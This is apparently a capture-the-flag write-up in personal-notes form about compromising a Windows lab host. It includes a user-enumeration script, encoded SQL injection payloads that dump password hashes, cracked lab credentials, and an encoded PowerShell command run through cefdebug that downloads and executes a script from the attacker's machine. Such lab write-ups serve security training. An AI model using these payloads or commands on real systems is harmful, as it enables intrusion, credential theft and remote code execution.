# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
<!--⚠️Imgur upload failed, check dev console-->
<!--⚠️Imgur upload failed, check dev console-->
![[Pasted image 20240502232338.png]]
<!--⚠️Imgur upload failed, check dev console-->
![[Pasted image 20240503075425.png]]
- All are not working, except 80
	- [ ] check the website, anything is close
		- [ ] it has an api u can get users from that, also password can be leaked.
		- [ ] SQLi  var isSimple = /^[a-zA-Z]+$/;
	- [ ] ffuf
	- [ ] shortname
![](https://i.imgur.com/pBz5Eg3.png)
```python
import requests

base_url = "http://megacorp.local/api/getColleagues"
file_name = "responses.txt"

# Alphabets from A-Z
alphabets = [chr(i) for i in range(ord('a'), ord('z')+1)]

# Headers
headers = {
    "Host": "megacorp.local",
    "Content-Length": "12",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "http://megacorp.local",
    "Referer": "http://megacorp.local/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

# Loop through the alphabets and send POST requests
for alphabet in alphabets:
    data = '{"name":"' + alphabet + '"}'
    response = requests.post(base_url, data=data, headers=headers)
    response_data = response.json()

    # Save response data to a file
    with open(file_name, "a") as file:
        file.write(f"Alphabet: {alphabet}\n")
        file.write(f"Response: {response_data}\n")
        file.write("\n")
```
![](https://i.imgur.com/Z1rj1KN.png)
- We have all the endpoints and Users, I tried kerberosting acc. it was not working. so the only thing that sends request to the browser is this page, and based on the field this can be vulnerable, more likely it is fetching from database, so it can be SQLi
	- ![](https://i.imgur.com/oS5nudM.png)
![](https://i.imgur.com/h2CibKd.png)
- I made a Python code to do the converstion but i recently discovered cyberchef can be used too
```PYTHON
def convert_to_unicode(input_string):
    unicode_content = ""
    for char in input_string:
        unicode_char = f"\\u{ord(char):04x}"
        unicode_content += unicode_char
    return unicode_content

# Infinite input taker and Unicode encoder
while True:
    user_input = input("Enter text to encode (or 'exit' to quit): ")

    if user_input.lower() == 'exit':
        break

    unicode_output = convert_to_unicode(user_input)
    print(f"Encoded text: {unicode_output}\n")
```
![](https://i.imgur.com/CiJwYQe.png)

- Using `order by` on sql i determined that there is 5 columns
	- ![](https://i.imgur.com/anYp5FL.png)
- Union to display the columns
![](https://i.imgur.com/t0sjJm1.png)
![](https://i.imgur.com/YcOmk6y.png)

![](https://i.imgur.com/S82W0Yo.png)
![](https://i.imgur.com/tY5Np0h.png)
`\u0061\u0027\u0020\u0055\u004e\u0049\u004f\u004e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0031\u002c\u0044\u0042\u005f\u004e\u0041\u004d\u0045\u0028\u0029\u002c\u0033\u002c\u0034\u002c\u0035\u002d\u002d\u0020\u002d`
![](https://i.imgur.com/DITVrhB.png)
`\u0061\u0027\u0020\u0055\u004e\u0049\u004f\u004e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0031\u002c\u0032\u002c\u0033\u002c\u0054\u0041\u0042\u004c\u0045\u005f\u004e\u0041\u004d\u0045\u002c\u0054\u0041\u0042\u004c\u0045\u005f\u0053\u0043\u0048\u0045\u004d\u0041\u0020\u0066\u0072\u006f\u006d\u0020\u0049\u004e\u0046\u004f\u0052\u004d\u0041\u0054\u0049\u004f\u004e\u005f\u0053\u0043\u0048\u0045\u004d\u0041\u002e\u0054\u0041\u0042\u004c\u0045\u0053\u0020\u0077\u0068\u0065\u0072\u0065\u0020\u0074\u0061\u0062\u006c\u0065\u005f\u0073\u0063\u0068\u0065\u006d\u0061\u003d\u0027\u0064\u0062\u006f\u0027\u002d\u002d\u0020\u002d`
![](https://i.imgur.com/0ycipqK.png)
- After i Determined the columns and tables, i dumpped the databse
`\u0061\u0027\u0020\u0055\u004e\u0049\u004f\u004e\u0020\u0073\u0065\u006c\u0065\u0063\u0074\u0020\u0031\u002c\u0032\u002c\u0033\u002c\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u002c\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0020\u0066\u0072\u006f\u006d\u0020\u0064\u0062\u006f\u002e\u004c\u006f\u0067\u0069\u006e\u0073\u002d\u002d\u0020\u002d`
```sql
[{"id":1,"name":"2","position":"3","email":"aldom","src":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739"},{"id":1,"name":"2","position":"3","email":"alyx","src":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa"},{"id":1,"name":"2","position":"3","email":"ckane","src":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813"},{"id":1,"name":"2","position":"3","email":"cyork","src":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739"},{"id":1,"name":"2","position":"3","email":"egre55","src":"cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc"},{"id":1,"name":"2","position":"3","email":"ilee","src":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813"},{"id":1,"name":"2","position":"3","email":"james","src":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739"},{"id":1,"name":"2","position":"3","email":"jorden","src":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739"},{"id":1,"name":"2","position":"3","email":"kpage","src":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813"},{"id":1,"name":"2","position":"3","email":"minatotw","src":"cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc"},{"id":1,"name":"2","position":"3","email":"nbourne","src":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa"},{"id":1,"name":"2","position":"3","email":"okent","src":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa"},{"id":1,"name":"2","position":"3","email":"rmartin","src":"fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa"},{"id":1,"name":"2","position":"3","email":"sbauer","src":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739"},{"id":1,"name":"2","position":"3","email":"shayna","src":"9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739"},{"id":1,"name":"2","position":"3","email":"zac","src":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813"},{"id":1,"name":"2","position":"3","email":"zpowers","src":"68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813"}]
```
![](https://i.imgur.com/o3bq5B7.png)
```json
- aldom,cyork,james,jorden,sbauer,shayna
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
- zpowers,zac,kpage,ilee,ckane
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
- rmartin,okent,nbourne
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
```
- Cracked the hash and did password spray but non of them worked, so i planned to do rid brutefoce using the mssql feature
- tries to identify the admins rid length, it is 28
	- ![](https://i.imgur.com/VuDPzRK.png)
	- ` tushikikatomo:finance1 `
### Gaining Access
![](https://i.imgur.com/brSaAlS.png)

## Internal
### Enumeration
- while enumerating
	- ![](https://i.imgur.com/bcl4Uwq.png)
- This Version is Vulnerable to  [cef debugging](https://github.com/taviso/cefdebug)
- ![](https://i.imgur.com/BH5sj75.png)
- `./cef.exe --code "process.mainModule.require('child_process').exec('powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA0ADkAOgA5ADAAOQAwAC8AcgBlAHgALgBwAHMAMQAnACkACgA')" --url ws://127.0.0.1:22952/96cc9331-45c7-4f74-a4e1-5b1f7e31357b`
- ![](https://i.imgur.com/ueCzzIR.png)
![](https://i.imgur.com/cYJuWrZ.png)
`type MultimasterAPI.dll`
![](https://i.imgur.com/aOrGr8F.png)
![](https://i.imgur.com/zFkPx2Y.png)
` sbauer:D3veL0pM3nT! `
- We have access to the Below remote group, but we dont have to the jorden acc ![](https://i.imgur.com/NqjlCdz.png)
![](https://i.imgur.com/cXc4Uzg.png)
### Gaining Access
![](https://i.imgur.com/TLDaOH5.png)

![](https://i.imgur.com/wE4gtzT.png)
![](https://i.imgur.com/CDoFXhd.png)
![](https://i.imgur.com/CHX8oIr.png)
` rainforest786    ($krb5asrep$jorden@MEGACORP.LOCAL)`
![](https://i.imgur.com/ehAgfjt.png)
![](https://i.imgur.com/V0cDcAU.png)
### Maintaining Access
![](https://i.imgur.com/8xNiblE.png)
![](https://i.imgur.com/sCcSshk.png)
# Random Notes
![](https://i.imgur.com/DItVslz.png)
